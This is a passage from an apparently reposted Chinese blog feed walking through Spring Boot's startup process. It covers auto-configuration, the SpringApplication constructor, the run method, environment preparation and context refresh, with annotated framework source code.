class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Exclude specific auto-configuration class names such that they will never be</span></span><br><span class="line"><span class="comment">    * applied.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> the class names to exclude</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@since</span> 1.3.0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   String[] excludeName() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@EnableAutoConfiguration借助@Import的帮助，将所有符合自动配置条件的bean定义加载到IoC容器，会根据类路径中的jar依赖为项目进行自动配置，如：添加了spring-boot-starter-web依赖，会自动添加Tomcat和Spring MVC的依赖，Spring Boot会对Tomcat和Spring MVC进行自动配置。</p><p><strong>最关键的要属@Import(EnableAutoConfigurationImportSelector.class)</strong> ，借助EnableAutoConfigurationImportSelector，@EnableAutoConfiguration可以帮助SpringBoot应用将所有符合条件的@Configuration配置都加载到当前SpringBoot创建并使用的IoC容器。就像一只“八爪鱼”一样，借助于Spring框架原有的一个工具类：SpringFactoriesLoader的支持，@EnableAutoConfiguration可以智能的自动配置功效才得以大功告成！</p><h4 id="1-1-3-ComponentScan"><a href="#1-1-3-ComponentScan" class="headerlink" title="1.1.3 @ComponentScan"></a>1.1.3 @ComponentScan</h4><p>@ComponentScan这个注解在Spring中很重要，它对应XML配置中的元素，@ComponentScan的功能其实就是自动扫描并加载符合条件的组件（比如@Component和@Repository等）或者bean定义，最终将这些bean定义加载到IoC容器中。</p><p>我们可以通过basePackages等属性来细粒度的定制@ComponentScan自动扫描的范围，如果不指定，则默认Spring框架实现会从声明@ComponentScan所在类的package进行扫描。</p><p>注：所以SpringBoot的启动类最好是放在root package下，因为默认不指定basePackages。</p><h2 id="2-构造器（Constructor）"><a href="#2-构造器（Constructor）" class="headerlink" title="2.构造器（Constructor）"></a>2.构造器（Constructor）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">java 代码解读复制代码<span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a new &#123;<span class="doctag">@link</span> SpringApplication&#125; instance. The application context will load</span></span><br><span class="line"><span class="comment"> * beans from the specified primary sources (see &#123;<span class="doctag">@link</span> SpringApplication class-level&#125;</span></span><br><span class="line"><span class="comment"> * documentation for details. The instance can be customized before calling</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> #run(String...)&#125;.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> resourceLoader the resource loader to use</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> primarySources the primary bean sources</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #run(Class, String[])</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #setSources(Set)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(&#123; <span class="string">"unchecked"</span>, <span class="string">"rawtypes"</span> &#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">SpringApplication</span><span class="params">(ResourceLoader resourceLoader, Class&lt;?&gt;... primarySources)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.resourceLoader = resourceLoader;</span><br><span class="line">   Assert.notNull(primarySources, <span class="string">"PrimarySources must not be null"</span>);</span><br><span class="line">   <span class="keyword">this</span>.primarySources = <span class="keyword">new</span> LinkedHashSet&lt;&gt;(Arrays.asList(primarySources));</span><br><span class="line">   <span class="comment">//2.1 判断当前程序类型</span></span><br><span class="line">   <span class="keyword">this</span>.webApplicationType = WebApplicationType.deduceFromClasspath();</span><br><span class="line">   <span class="comment">//2.2 使用SpringFactoriesLoader 实例化所有可用的初始器</span></span><br><span class="line">   setInitializers((Collection)                        getSpringFactoriesInstances(ApplicationContextInitializer<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">   <span class="comment">//2.3 使用SpringFactoriesLoader 实例化所有可用的监听器</span></span><br><span class="line">  setListeners((Collection) getSpringFactoriesInstances(ApplicationListener<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">   <span class="comment">//2.4 配置应用主方法所在类</span></span><br><span class="line">   <span class="keyword">this</span>.mainApplicationClass = deduceMainApplicationClass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-1-判断当前程序类型"><a href="#2-1-判断当前程序类型" class="headerlink" title="2.1 判断当前程序类型"></a>2.1 判断当前程序类型</h4><p>根据classpath里面是否存在某个特征类</p><p>（org.springframework.web.context.ConfigurableWebApplicationContext）来决定是否应该创建一个为Web应用使用的ApplicationContext类型。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">css</span> 代码解读复制代码<span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The application should not run as a web application and should not start an</span></span><br><span class="line"><span class="comment"> * embedded web server.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="selector-tag">NONE</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The application should run as a servlet-based web application and should start an</span></span><br><span class="line"><span class="comment"> * embedded servlet web server.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="selector-tag">SERVLET</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The application should run as a reactive web application and should start an</span></span><br><span class="line"><span class="comment"> * embedded reactive web server.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="selector-tag">REACTIVE</span>;</span><br></pre></td></tr></table></figure><h2 id="3-启动方法（RUN）"><a href="#3-启动方法（RUN）" class="headerlink" title="3.启动方法（RUN）"></a>3.启动方法（RUN）</h2><p>初始化完成之后就进到了run方法，run方法完成了所有Spring的整个启动过程：</p><ul><li><p>准备Environment</p></li><li><p>发布事件</p></li><li><p>创建上下文、bean</p></li><li><p>刷新上下文</p></li><li><p>结束，</p><p>其中穿插了很多监听器的动作，并且很多逻辑都是靠各种监听器的实现类执行的。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">java 代码解读复制代码<span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Run the Spring application, creating and refreshing a new</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> ApplicationContext&#125;.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args the application arguments (usually passed from a Java main method)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> a running &#123;<span class="doctag">@link</span> ApplicationContext&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ConfigurableApplicationContext <span class="title">run</span><span class="params">(String... args)</span> </span>&#123;</span><br><span class="line">   <span class="comment">//开启时钟计时</span></span><br><span class="line">   StopWatch stopWatch = <span class="keyword">new</span> StopWatch();</span><br><span class="line">   stopWatch.start();</span><br><span class="line">   <span class="comment">//spirng 上下文</span></span><br><span class="line">   ConfigurableApplicationContext context = <span class="keyword">null</span>;</span><br><span class="line">   <span class="comment">//启动异常报告容器</span></span><br><span class="line">   Collection&lt;SpringBootExceptionReporter&gt; exceptionReporters = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">   <span class="comment">//开启设置，让系统模拟不存在io设备</span></span><br><span class="line">   configureHeadlessProperty();</span><br><span class="line">   <span class="comment">// 3.1 初始化SpringApplicationRunListener 监听器，并进行封装</span></span><br><span class="line">   SpringApplicationRunListeners listeners = getRunListeners(args);</span><br><span class="line">   listeners.starting();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      ApplicationArguments applicationArguments = <span class="keyword">new</span> DefaultApplicationArguments(args);</span><br><span class="line">     <span class="comment">//3.2 Environment 的准备 </span></span><br><span class="line">      ConfigurableEnvironment environment = prepareEnvironment(listeners, applicationArguments);</span><br><span class="line">      configureIgnoreBeanInfo(environment);</span><br><span class="line">      Banner printedBanner = printBanner(environment); <span class="comment">// 打印标语 彩蛋</span></span><br><span class="line">     <span class="comment">//3.3 创建上下文实例</span></span><br><span class="line">      context = createApplicationContext();</span><br><span class="line">     <span class="comment">//异常播报器，默认有org.springframework.boot.diagnostics.FailureAnalyzers</span></span><br><span class="line">      exceptionReporters = getSpringFactoriesInstances(SpringBootExceptionReporter<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line">            new Class[] &#123; ConfigurableApplicationContext.class &#125;, context);</span><br><span class="line">     <span class="comment">//3.4 容器初始化</span></span><br><span class="line">      prepareContext(context, environment, listeners, applicationArguments, printedBanner);</span><br><span class="line">     <span class="comment">//3.5 刷新上下文容器 </span></span><br><span class="line">      refreshContext(context);</span><br><span class="line">     <span class="comment">//给实现类留的钩子，这里是一个空方法。</span></span><br><span class="line">      afterRefresh(context, applicationArguments);</span><br><span class="line">      stopWatch.stop();</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.logStartupInfo) &#123;</span><br><span class="line">         <span class="keyword">new</span> StartupInfoLogger(<span class="keyword">this</span>.mainApplicationClass).logStarted(getApplicationLog(), stopWatch);</span><br><span class="line">      &#125;</span><br><span class="line">      listeners.started(context);</span><br><span class="line">      callRunners(context, applicationArguments);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">      handleRunFailure(context, ex, exceptionReporters, listeners);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(ex);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      listeners.running(context);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">      handleRunFailure(context, ex, exceptionReporters, <span class="keyword">null</span>);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(ex);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> context;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-SpringApplicationRunListener-的使用"><a href="#3-1-SpringApplicationRunListener-的使用" class="headerlink" title="3.1 SpringApplicationRunListener 的使用"></a>3.1 SpringApplicationRunListener 的使用</h3><p>首先通过getSpringFactoriesInstances 获取到所有实现SpringApplicationRunListener  接口的实例，默认情况下该接口的实现类只有 EventPublishingRunListener  他的主要作用是作为springboot 的一个广播器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">java 代码解读复制代码<span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">SpringApplicationRunListener</span> </span>&#123;</span><br><span class="line">  <span class="comment">/**EventPublishingRunListener 前期采用 SimpleApplicationEventMulticaster.multicastEvent(ApplicationEvent) 进行广播</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">   <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">starting</span><span class="params">()</span> </span>&#123;&#125; </span><br><span class="line">   <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">environmentPrepared</span><span class="params">(ConfigurableEnvironment environment)</span> </span>&#123;&#125;</span><br><span class="line">   <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">contextPrepared</span><span class="params">(ConfigurableApplicationContext context)</span> </span>&#123;&#125;</span><br><span class="line">   <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">contextLoaded</span><span class="params">(ConfigurableApplicationContext context)</span> </span>&#123;&#125;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  EventPublishingRunListener 后期采用 context.publishEvent(ApplicationEvent)</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">   <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">started</span><span class="params">(ConfigurableApplicationContext context)</span> </span>&#123;&#125;</span><br><span class="line">   <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">running</span><span class="params">(ConfigurableApplicationContext context)</span> </span>&#123;&#125;</span><br><span class="line">   <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">failed</span><span class="params">(ConfigurableApplicationContext context, Throwable exception)</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-prepareEnvironment"><a href="#3-2-prepareEnvironment" class="headerlink" title="3.2 prepareEnvironment"></a>3.2 prepareEnvironment</h3><p>一般在写业务代码时使用的都是只读类型的接口<code>Environment</code>，该接口是对运行程序环境的抽象，是保存系统配置的中心，而在启动过程中使用的则是可编辑的<code>ConfigurableEnvironment</code>。接口的UML类图如下，提供了合并父环境、添加active profile以及一些设置解析配置文件方式的接口。</p><p>其中一个比较重要的方法<code>MutablePropertySources getPropertySources();</code>，该方法返回一个可编辑的<code>PropertySources</code>，如果有在启动阶段自定义环境的PropertySources的需求，就可以通过该方法设置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">java 代码解读复制代码<span class="function"><span class="keyword">private</span> ConfigurableEnvironment <span class="title">prepareEnvironment</span><span class="params">(SpringApplicationRunListeners listeners,</span></span></span><br><span class="line"><span class="function"><span class="params">      ApplicationArguments applicationArguments)</span> </span>&#123;</span><br><span class="line">   <span class="comment">// Create and configure the environment</span></span><br><span class="line">  <span class="comment">//根据不同环境不同的Enviroment （StandardServletEnvironment，StandardReactiveWebEnvironment，StandardEnvironment）</span></span><br><span class="line">   ConfigurableEnvironment environment = getOrCreateEnvironment();</span><br><span class="line">  <span class="comment">//填充启动类参数到enviroment 对象</span></span><br><span class="line">   configureEnvironment(environment, applicationArguments.getSourceArgs());</span><br><span class="line">  <span class="comment">//更新参数</span></span><br><span class="line">  ConfigurationPropertySources.attach(environment);</span><br><span class="line">  <span class="comment">//发布事件 </span></span><br><span class="line">  listeners.environmentPrepared(environment);</span><br><span class="line">  <span class="comment">//绑定主类 </span></span><br><span class="line">  bindToSpringApplication(environment);</span><br><span class="line">   <span class="keyword">if</span> (!<span class="keyword">this</span>.isCustomEnvironment) &#123;<span class="comment">//转换environment的类型，但这里应该类型和deduce的相同不用转换</span></span><br><span class="line">      environment = <span class="keyword">new</span> EnvironmentConverter(getClassLoader()).convertEnvironmentIfNecessary(environment,</span><br><span class="line">            deduceEnvironmentClass());</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="comment">//将现有参数有封装成proertySources</span></span><br><span class="line">   ConfigurationPropertySources.attach(environment);</span><br><span class="line">   <span class="keyword">return</span> environment;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-创建springApplicationContext-上下文"><a href="#3-3-创建springApplicationContext-上下文" class="headerlink" title="3.3  创建springApplicationContext 上下文"></a>3.3  创建springApplicationContext 上下文</h3><p><img src="/img/springboot/boot1.png" alt="springboot"> </p><p>继承的三个父类接口里，<code>Closeable</code>提供了关闭时资源释放的接口，<code>Lifecycle</code>是提供对生命周期控制的接口(start\stop)以及查询当前运行状态的接口，<code>ApplicationContext</code>则是配置上下文的中心配置接口，继承了其他很多配置接口，其本身提供查询诸如id、应用程序名等上下文档案信息的只读接口，以及构建自动装配bean的工厂。</p><ul><li>EnvironmentCapable</li></ul><p>提供Environment接口。</p><ul><li>MessageSource</li></ul><p>国际化资源接口。</p><ul><li>ApplicationEventPublisher</li></ul><p>事件发布器。</p><ul><li>ResourcePatternResolver</li></ul><p>资源加载器。</p><ul><li>HierarchicalBeanFactory、ListableBeanFactory</li></ul><p>这两个都继承了bean容器的根接口<code>BeanFactory</code></p><p>简而言之就是根据Web容器类型的不同来创建不用的上下文实例。</p><h3 id="3-4-上下文初始化"><a href="#3-4-上下文初始化" class="headerlink" title="3.4 上下文初始化"></a>3.4 上下文初始化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">java 代码解读复制代码<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">prepareContext</span><span class="params">(ConfigurableApplicationContext context, ConfigurableEnvironment environment,</span></span></span><br><span class="line"><span class="function"><span class="params">      SpringApplicationRunListeners listeners, ApplicationArguments applicationArguments, Banner printedBanner)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//绑定环境</span></span><br><span class="line">   context.setEnvironment(environment);</span><br><span class="line">  <span class="comment">//如果application有设置beanNameGenerator、resourceLoader就将其注入到上下文中，并将转换工具也注入到上下文中</span></span><br><span class="line">  postProcessApplicationContext(context);</span><br><span class="line">  <span class="comment">//调用初始化的切面</span></span><br><span class="line">   applyInitializers(context);</span><br><span class="line">  <span class="comment">//发布ApplicationContextInitializedEvent事件</span></span><br><span class="line">   listeners.contextPrepared(context);</span><br><span class="line">  <span class="comment">//日志</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">this</span>.logStartupInfo) &#123;</span><br><span class="line">      logStartupInfo(context.getParent() == <span class="keyword">null</span>);</span><br><span class="line">      logStartupProfileInfo(context);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// Add boot specific singleton beans</span></span><br><span class="line">   ConfigurableListableBeanFactory beanFactory = context.getBeanFactory();</span><br><span class="line">   beanFactory.registerSingleton(<span class="string">"springApplicationArguments"</span>, applicationArguments);</span><br><span class="line">   <span class="keyword">if</span> (printedBanner != <span class="keyword">null</span>) &#123;</span><br><span class="line">      beanFactory.registerSingleton(<span class="string">"springBootBanner"</span>, printedBanner);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (beanFactory <span class="keyword">instanceof</span> DefaultListableBeanFactory) &#123;</span><br><span class="line">     <span class="comment">//如果bean名相同的话是否允许覆盖，默认为false，相同会抛出异常</span></span><br><span class="line">      ((DefaultListableBeanFactory) beanFactory)</span><br><span class="line">            .setAllowBeanDefinitionOverriding(<span class="keyword">this</span>.allowBeanDefinitionOverriding);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">this</span>.lazyInitialization) &#123;</span><br><span class="line">      context.addBeanFactoryPostProcessor(<span class="keyword">new</span> LazyInitializationBeanFactoryPostProcessor());</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// Load the sources</span></span><br><span class="line">  <span class="comment">// 这里获取到的是BootstrapImportSelectorConfiguration这个class，而不是自己写的启动来，这个class是在之前注册的BootstrapApplicationListener的监听方法中注入的</span></span><br><span class="line">   Set&lt;Object&gt; sources = getAllSources();</span><br><span class="line">   Assert.notEmpty(sources, <span class="string">"Sources must not be empty"</span>);</span><br><span class="line">  <span class="comment">//加载sources 到上下文中</span></span><br><span class="line">   load(context, sources.toArray(<span class="keyword">new</span> Object[<span class="number">0</span>]));</span><br><span class="line">  <span class="comment">//发布ApplicationPreparedEvent事件</span></span><br><span class="line">   listeners.contextLoaded(context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-5-刷新上下文"><a href="#3-5-刷新上下文" class="headerlink" title="3.5 刷新上下文"></a>3.5 刷新上下文</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"> 代码解读</span><br><span class="line">复制代码AbstractApplicationContext</span><br><span class="line">java 代码解读复制代码public void refresh() throws BeansException, IllegalStateException &#123;</span><br><span class="line">    synchronized (this.startupShutdownMonitor) &#123;</span><br><span class="line">        &#x2F;&#x2F;记录启动时间、状态，web容器初始化其property，复制listener</span><br><span class="line">        prepareRefresh();</span><br><span class="line">        &#x2F;&#x2F;这里返回的是context的BeanFactory</span><br><span class="line">        ConfigurableListableBeanFactory beanFactory &#x3D; obtainFreshBeanFactory();</span><br><span class="line">        &#x2F;&#x2F;beanFactory注入一些标准组件，例如ApplicationContextAwareProcessor，ClassLoader等</span><br><span class="line">        prepareBeanFactory(beanFactory);</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F;给实现类留的一个钩子，例如注入BeanPostProcessors，这里是个空方法</span><br><span class="line">            postProcessBeanFactory(beanFactory);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 调用切面方法</span><br><span class="line">            invokeBeanFactoryPostProcessors(beanFactory);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 注册切面bean</span><br><span class="line">            registerBeanPostProcessors(beanFactory);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Initialize message source for this context.</span><br><span class="line">            initMessageSource();</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; bean工厂注册一个key为applicationEventMulticaster的广播器</span><br><span class="line">            initApplicationEventMulticaster();</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 给实现类留的一钩子，可以执行其他refresh的工作，这里是个空方法</span><br><span class="line">            onRefresh();</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 将listener注册到广播器中</span><br><span class="line">            registerListeners();</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 实例化未实例化的bean</span><br><span class="line">            finishBeanFactoryInitialization(beanFactory);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 清理缓存，注入DefaultLifecycleProcessor，发布ContextRefreshedEvent</span><br><span class="line">            finishRefresh();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        catch (BeansException ex) &#123;</span><br><span class="line">            if (logger.isWarnEnabled()) &#123;</span><br><span class="line">                logger.warn(&quot;Exception encountered during context initialization - &quot; +</span><br><span class="line">                        &quot;cancelling refresh attempt: &quot; + ex);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Destroy already created singletons to avoid dangling resources.</span><br><span class="line">            destroyBeans();</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Reset &#39;active&#39; flag.</span><br><span class="line">            cancelRefresh(ex);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Propagate exception to caller.</span><br><span class="line">            throw ex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        finally &#123;</span><br><span class="line">            &#x2F;&#x2F; Reset common introspection caches in Spring&#39;s core, since we</span><br><span class="line">            &#x2F;&#x2F; might not ever need metadata for singleton beans anymore...</span><br><span class="line">            resetCommonCaches();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此spring 启动主要工作基本完成，接下来发布AppStartedEvent事件，回调ApplicationRunner，CommandLineRunner等runner，发布applicationReadyEvent事件，spring 正式启动开始运行。</p><h2 id="转载地址"><a href="#转载地址" class="headerlink" title="转载地址"></a>转载地址</h2><p><a href="https://juejin.cn/post/7035910505810100255" target="_blank" rel="noopener">https://juejin.cn/post/7035910505810100255</a></p>]]></content>
      
      
      <categories>
          
          <category> springboot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elasticsearch——复合查询</title>
      <link href="/2023/12/21/Elasticsearch%E2%80%94%E2%80%94%E5%A4%8D%E5%90%88%E6%9F%A5%E8%AF%A2/"/>
      <url>/2023/12/21/Elasticsearch%E2%80%94%E2%80%94%E5%A4%8D%E5%90%88%E6%9F%A5%E8%AF%A2/</url>
      
